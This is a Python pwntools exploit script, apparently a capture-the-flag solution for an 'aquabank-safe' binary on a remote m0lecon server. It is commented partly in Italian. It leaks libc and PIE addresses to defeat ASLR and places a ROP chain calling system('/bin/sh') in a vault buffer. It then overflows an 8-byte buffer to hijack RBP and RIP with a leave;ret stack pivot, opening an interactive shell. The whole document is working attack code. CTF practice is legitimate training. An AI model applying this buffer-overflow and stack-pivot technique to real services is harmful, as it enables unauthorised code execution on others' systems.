#!/usr/bin/env python3
from pwn import *

exe = './aquabank-safe'
context.binary = elf = ELF(exe, checksec=False)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#p = process(elf.path)
p =remote("offsec.m0lecon.it", 13565)

# Stage 1: information leak
p.sendlineafter(b'> ', b'1')
p.recvuntil(b'printf @ ')

printf_leak = int(p.recvline().strip(), 16)

p.recvuntil(b'entry  @ ')
diag_leak = int(p.recvline().strip(), 16)

libc.address = printf_leak - libc.sym['printf']
elf.address = diag_leak - elf.sym['diagnostics']

log.success(f"Libc base: {hex(libc.address)}")
log.success(f"PIE base: {hex(elf.address)}")

vault_addr = elf.sym['vault']
log.success(f"Vault address: {hex(vault_addr)}")

# Stage 2: ROP chain
rop_libc = ROP(libc)
ret = rop_libc.find_gadget(['ret'])[0]
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

SAFE_OFFSET = 0x800

# La ROP Chain pronta nel vault
vault_payload = flat(
    b'A' * SAFE_OFFSET,
    p64(0),          # [vault+0x800] Finisce in RBP durante il secondo 'leave'
    p64(ret),        # [vault+0x808] Stack Alignment per MOVAPS
    p64(pop_rdi),    # [vault+0x810] Inizio della chain reale
    p64(binsh),      # [vault+0x818] Argomento
    p64(system)      # [vault+0x820] shell
)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'size (bytes): ', str(len(vault_payload)).encode())
p.sendafter(b'bytes:\n', vault_payload)

# Stage 3: devo dire alla CPU di smettere di leggere lo stack e iniziare a leggere il vault nostro
rop_elf = ROP(elf)
leave_ret = rop_elf.find_gadget(['leave', 'ret'])[0]

pivot_payload = flat(
    b'A' * 8,                          # riempio buf[8]
    p64(vault_addr + SAFE_OFFSET),     # sovrascrivo l'RBP
    p64(leave_ret)                     # sovrascrivo RIP
)

p.sendlineafter(b'> ', b'3')

# quando open_safe() fa "return": fatto
p.sendafter(b'combination:\n', pivot_payload)
p.interactive()
